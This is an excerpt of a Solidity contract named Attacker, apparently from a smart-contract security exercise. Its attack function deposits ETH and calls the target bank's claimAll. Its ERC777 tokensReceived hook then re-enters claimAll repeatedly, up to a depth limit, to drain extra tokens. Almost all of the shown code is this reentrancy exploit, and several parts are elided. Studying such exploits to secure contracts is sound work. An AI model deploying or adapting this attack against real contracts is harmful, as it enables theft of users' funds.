...
contract Attacker is AccessControl, IERC777Recipient {
	...
	*/
	function attack(uint256 amt) payable public {
      require( address(bank) != address(0), "Target bank not set" );
		...
		// First, deposit ETH to get a positive balance
		bank.deposit{value: amt}();
		
		// Then call claimAll() to start the reentrancy attack
		// This will mint tokens and trigger tokensReceived
		bank.claimAll();
	}
	...
	*/
	function tokensReceived(
		...
		// Only proceed if this is the bank's token
		require(msg.sender == address(bank.token()), "Invalid token");
		
		// Only proceed if we're the recipient
		...
		// If we haven't reached max depth and the bank still has a balance for us, recurse
		if (depth < max_depth && bank.balances(address(this)) > 0) {
			// Recursively call claimAll() to steal more tokens
			bank.claimAll();
		}
		
		// Decrement depth counter when returning
		depth--;
	}
